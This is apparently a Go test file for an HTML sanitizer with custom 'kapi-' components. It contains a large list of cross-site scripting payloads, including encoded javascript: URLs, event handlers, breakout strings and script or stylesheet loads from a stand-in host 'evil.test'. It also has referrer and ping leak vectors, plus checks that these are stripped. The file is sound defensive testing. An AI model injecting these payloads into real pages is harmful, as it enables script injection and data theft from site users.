package render

import (
	"strings"
	"testing"

	"golang.org/x/net/html"
)

var payloads = []string{
	`<script>alert(1)</script>`,
	`<SCRIPT SRC=//evil.test/x.js></SCRIPT>`,
	`<img src=x onerror=alert(1)>`,
	`<svg onload=alert(1)><circle r=1></circle></svg>`,
	`<math><mi xlink:href="javascript:alert(1)">x</mi></math>`,
	`<iframe src="javascript:alert(1)"></iframe>`,
	`<object data="javascript:alert(1)"></object>`,
	`<embed src="javascript:alert(1)">`,
	`<a href="javascript:alert(1)">x</a>`,
	`<a href=" JaVaScRiPt:alert(1)">x</a>`,
	`<a href="jav&#x09;ascript:alert(1)">x</a>`,
	`<a href="java&#0;script:alert(1)">x</a>`,
	`<a href="&#106;avascript:alert(1)">x</a>`,
	`<a href="vbscript:msgbox(1)">x</a>`,
	`<a href="data:text/html,<script>alert(1)</script>">x</a>`,
	`<img src="data:image/svg+xml,<svg onload=alert(1)>">`,
	`<blockquote cite="javascript:alert(1)">q</blockquote>`,
	`<p style="background:url(javascript:alert(1))">styled</p>`,
	`<style>body{background:red}</style>`,
	`<link rel=stylesheet href=//evil.test/x.css>`,
	`<base href="javascript:alert(1)//">`,
	`<meta http-equiv="refresh" content="0;url=javascript:alert(1)">`,
	`<form action="javascript:alert(1)"><button formaction="javascript:alert(1)">go</button><input onfocus=alert(1) autofocus></form>`,
	`<details open ontoggle=alert(1)><summary>x</summary></details>`,
	`<template><script>alert(1)</script></template>`,
	`<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>`,
	`<!--><script>alert(1)</script>-->`,
	`<p onclick="alert(1)" onmouseover="alert(1)" ONLOAD="alert(1)">p</p>`,
	`<div data-x="1" aria-label="ok" onpointerenter=alert(1)>d</div>`,
	`<xmp><script>alert(1)</script></xmp>`,
	`<textarea><script>alert(1)</script></textarea>`,
	`<p id="kapi-page">clobber</p>`,
	`<img src="a.png" referrerpolicy="unsafe-url" srcset="https://e.test/x 1x"><a href="/" ping="https://e.test/" referrerpolicy="unsafe-url">x</a>`,
	`<meta name="referrer" content="unsafe-url"><link rel="prefetch" href="https://e.test/"><base href="https://e.test/">`,
	`</kapi-code><script>alert(1)</script>`,
	`"><script>alert(1)</script>`,
	`' onmouseover='alert(1)`,
	`a" onload="alert(1)`,
	`a" onmouseover="alert(1)" x="`,
}

var attrPayloads = []string{
	`"><script>alert(1)</script>`,
	`" onmouseover="alert(1)`,
	`javascript:alert(1)`,
	`</textarea><script>alert(1)</script>`,
}

var containers = []string{
	`%s`,
	`<p data-kapi-id="aaaaaaaa">%s</p>`,
	`<kapi-callout kind="note">%s</kapi-callout>`,
	`<kapi-compare><kapi-option title="t">%s</kapi-option></kapi-compare>`,
	`<kapi-plan><kapi-step>%s</kapi-step><kapi-risk>%s</kapi-risk><kapi-question>%s</kapi-question></kapi-plan>`,
	`<kapi-table><table><tr><td>%s</td></tr></table></kapi-table>`,
	`<kapi-form name="f"><kapi-choice name="c">%s<kapi-opt value="v">%s</kapi-opt></kapi-choice><kapi-text name="t">%s</kapi-text></kapi-form>`,
	`<kapi-code lang="html">%s</kapi-code>`,
	`<kapi-diff>@@ -1 +1 @@` + "\n" + `-%s` + "\n" + `+%s</kapi-diff>`,
	`<kapi-diagram>a -> b: %s</kapi-diagram>`,
	`<kapi-diagram type="sequence">a -> b: %s</kapi-diagram>`,
	`<kapi-diagram>%s -> b: x</kapi-diagram>`,
	`<kapi-diagram>a -> %s</kapi-diagram>`,
	`<kapi-diagram>%s</kapi-diagram>`,
	`<kapi-diagram type="sequence">%s -> b: x</kapi-diagram>`,
	`<kapi-diagram type="sequence">%s</kapi-diagram>`,
	`<kapi-nosuch>%s</kapi-nosuch>`,
	`<p>a <kapi-badge tone="info">%s</kapi-badge></p>`,
	`<kapi-badge tone="%s">x</kapi-badge>`,
	`<kapi-kv><kapi-item key="k">%s</kapi-item></kapi-kv>`,
	`<kapi-kv><kapi-item key="%s">v</kapi-item>%s</kapi-kv>`,
}

var presetAttrs = map[string][]string{
	"kapi-callout": {"kind"},
	"kapi-code":    {"lang", "file", "lines"},
	"kapi-diff":    {"lang", "file"},
	"kapi-table":   {"sort"},
	"kapi-diagram": {"type"},
	"kapi-form":    {"name"},
	"kapi-badge":   {"tone"},
}

func TestSanitizerPayloadsInEveryContainer(t *testing.T) {
	for _, c := range containers {
		for _, p := range payloads {
			src := strings.ReplaceAll(c, "%s", p)
			assertSafe(t, src, render(t, src))
		}
	}
}

func TestSanitizerAttributePayloads(t *testing.T) {
	var srcs []string
	for _, p := range attrPayloads {
		q := html.EscapeString(p)
		for tag, attrs := range presetAttrs {
			for _, a := range attrs {
				srcs = append(srcs, `<`+tag+` `+a+`="`+q+`" data-kapi-id="`+q+`">a -> b</`+tag+`>`)
			}
		}
		srcs = append(srcs,
			`<kapi-compare><kapi-option title="`+q+`">x</kapi-option></kapi-compare>`,
			`<kapi-kv data-kapi-id="`+q+`"><kapi-item key="`+q+`" data-kapi-id="`+q+`">x</kapi-item></kapi-kv>`,
			`<kapi-form name="`+q+`"><kapi-choice name="`+q+`"><kapi-opt value="`+q+`">x</kapi-opt></kapi-choice><kapi-text name="`+q+`">x</kapi-text></kapi-form>`,
			`<a href="`+q+`" title="`+q+`" class="`+q+`" data-x="`+q+`">x</a>`,
			`<img src="`+q+`" alt="`+q+`">`,
			`<td colspan="`+q+`">x</td>`,
		)
	}
	for _, src := range srcs {
		assertSafe(t, src, render(t, src))
	}
}

func TestSanitizerKeepsSafeContent(t *testing.T) {
	cases := map[string]string{
		`<a href="https://example.com/a?b=1">x</a>`: `href="https://example.com/a?b=1"`,
		`<a href="/relative/path">x</a>`:            `href="/relative/path"`,
		`<a href="#k3f9a2bq">x</a>`:                 `href="#k3f9a2bq"`,
		`<a href="mailto:a@b.c">x</a>`:              `href="mailto:a@b.c"`,
		`<a href="docs/a:b">x</a>`:                  `href="docs/a:b"`,
		`<img src="data:image/png;base64,AAAA">`:    `src="data:image/png;base64,AAAA"`,
		`<p data-kapi-state="done">x</p>`:           `data-kapi-state="done"`,
		`<p aria-label="label">x</p>`:               `aria-label="label"`,
		`<kapi-code><b></kapi-code>`:                `&lt;b&gt;`,
	}
	for src, want := range cases {
		if got := render(t, src); !strings.Contains(got, want) {
			t.Errorf("Render(%q) = %q, want it to keep %q", src, got, want)
		}
	}
}

func TestSanitizerDropsDangerousContent(t *testing.T) {
	cases := map[string]string{
		`<p style="color:red">x</p>`:                `style`,
		`<p onclick="alert(1)">x</p>`:               `onclick`,
		`<script>alert(1)</script><p>x</p>`:         `alert`,
		`<style>p{}</style><p>x</p>`:                `p{}`,
		`<a href="javascript:alert(1)">x</a>`:       `href`,
		`<a href="jav&#x09;ascript:alert(1)">x</a>`: `href`,
		`<img src="data:text/html,x">`:              `src`,
		`<p id="kapi-page">x</p>`:                   `id=`,
	}
	for src, banned := range cases {
		if got := render(t, src); strings.Contains(got, banned) {
			t.Errorf("Render(%q) = %q, still contains %q", src, got, banned)
		}
	}
}

func TestSanitizerDropsReferrerLeaks(t *testing.T) {
	cases := []struct{ src, banned string }{
		{`<img src="a.png" referrerpolicy="unsafe-url">`, "referrerpolicy"},
		{`<a href="https://e.test/" referrerpolicy="unsafe-url">x</a>`, "referrerpolicy"},
		{`<kapi-callout><p referrerpolicy="unsafe-url">x</p></kapi-callout>`, "referrerpolicy"},
		{`<a href="https://e.test/" ping="https://e.test/p">x</a>`, "ping"},
		{`<img src="a.png" srcset="https://e.test/x.png 1x">`, "srcset"},
		{`<kapi-form name="f"><button formaction="https://e.test/">x</button><kapi-text name="t">t</kapi-text></kapi-form>`, "formaction"},
		{`<meta name="referrer" content="unsafe-url"><p>x</p>`, "<meta"},
		{`<p>x<meta name="referrer" content="unsafe-url"></p>`, "<meta"},
		{`<kapi-plan><kapi-step><meta name="referrer" content="unsafe-url">x</kapi-step></kapi-plan>`, "<meta"},
		{`<link rel="prefetch" href="https://e.test/"><p>x</p>`, "<link"},
		{`<ul><li><link rel="stylesheet" href="https://e.test/x.css"></li></ul>`, "<link"},
		{`<base href="https://e.test/"><p>x</p>`, "<base"},
		{`<div><base href="https://e.test/"></div>`, "<base"},
	}
	for _, c := range cases {
		if got := render(t, c.src); strings.Contains(got, c.banned) {
			t.Errorf("Render(%q) = %q, still contains %q", c.src, got, c.banned)
		}
	}
}

func assertSafe(t *testing.T, src, out string) {
	t.Helper()
	doc, err := html.Parse(strings.NewReader("<!doctype html><body>" + out))
	if err != nil {
		t.Fatal(err)
	}
	var walk func(n *html.Node, inDiagram bool)
	walk = func(n *html.Node, inDiagram bool) {
		if n.Type == html.ElementNode {
			switch n.Data {
			case "script", "style", "iframe", "object", "embed", "base", "link", "meta", "template", "math", "noscript", "frame", "frameset":
				t.Errorf("source %q rendered a <%s>:\n%s", src, n.Data, out)
			case "svg":
				if !inDiagram {
					t.Errorf("source %q rendered an <svg> outside a diagram:\n%s", src, out)
				}
			case "input", "button", "textarea":
				if !insideClass(n, "kapi-form") {
					t.Errorf("source %q rendered a <%s> outside a kapi-form:\n%s", src, n.Data, out)
				}
			}
			if hasClass(n, "kapi-diagram") {
				inDiagram = true
			}
			for _, a := range n.Attr {
				key := strings.ToLower(a.Key)
				val := strings.ToLower(strings.Join(strings.Fields(a.Val), ""))
				switch {
				case strings.HasPrefix(key, "on"):
					t.Errorf("source %q rendered event handler %s=%q:\n%s", src, a.Key, a.Val, out)
				case key == "style", key == "referrerpolicy", key == "ping", key == "srcset", key == "formaction":
					t.Errorf("source %q rendered a %s attribute:\n%s", src, a.Key, out)
				case key == "id" && strings.HasPrefix(val, "kapi") && (!inDiagram || n.Data != "marker"):
					t.Errorf("source %q rendered a reserved id %q:\n%s", src, a.Val, out)
				case key == "href" || key == "src" || key == "cite" || key == "action" || key == "formaction" || strings.HasSuffix(key, "href"):
					if strings.Contains(val, "script:") || (strings.HasPrefix(val, "data:") && !strings.HasPrefix(val, "data:image/png")) {
						t.Errorf("source %q rendered a dangerous URL %s=%q:\n%s", src, a.Key, a.Val, out)
					}
				}
			}
		}
		for c := n.FirstChild; c != nil; c = c.NextSibling {
			walk(c, inDiagram)
		}
	}
	walk(doc, false)
}

func hasClass(n *html.Node, class string) bool {
	for _, a := range n.Attr {
		if a.Key == "class" {
			for _, c := range strings.Fields(a.Val) {
				if c == class {
					return true
				}
			}
		}
	}
	return false
}

func insideClass(n *html.Node, class string) bool {
	for p := n; p != nil; p = p.Parent {
		if hasClass(p, class) {
			return true
		}
	}
	return false
}
